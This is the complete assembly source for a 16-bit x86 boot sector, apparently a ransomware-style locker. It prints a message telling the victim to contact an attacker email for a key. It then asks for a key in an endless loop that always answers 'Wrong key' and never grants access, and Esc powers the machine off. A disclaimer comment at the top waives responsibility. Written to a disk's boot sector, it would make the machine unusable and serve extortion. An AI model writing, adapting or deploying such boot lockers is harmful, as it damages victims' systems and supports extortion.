; Sorumluluk kabul etmiyorum!
[bits 16]
[org 0x7c00]
section .data
section .text
  global main
main:
  mov ah,0x00
  mov al,0x00
  int 10h
  mov di,message
  call yaz

confrim:
  call newline
  mov di,key
  call yaz
  call read
  mov di,wr
  call yaz
  jmp confrim

newline:
  mov ah,0xe
  mov al,10
  int 10h
  mov al,13
  int 10h
  ret

yaz:
  cmp byte [di], 0x00
  je yazson
  mov ah,0xe
  mov al,[di]
  int 10h
  inc di
  jmp yaz
  yazson:
  ret

read:
  mov ah,0x00
  int 16h
  mov ah,0xe
  cmp al,0xd
  je readend
  cmp al,0x1b
  je shut
  int 10h
  inc cx
  jmp read
  readend:
  mov ah,0xe
  mov al,10
  int 10h
  mov al,13
  int 10h
  ret

shut:
    mov ax, 0x1000
    mov ax, ss
    mov sp, 0xf000
    mov ax, 0x5307
    mov bx, 0x0001
    mov cx, 0x0003
    int 0x15

tr db "Access granted",0x00
wr db " [-] Wrong key !",0x00
key db "Key: ",0x00
message db "contact to name@atacker.com for key. to shutdown, press esc",0x00
times 510 - ($-$$) db 0
dw 0xaa55
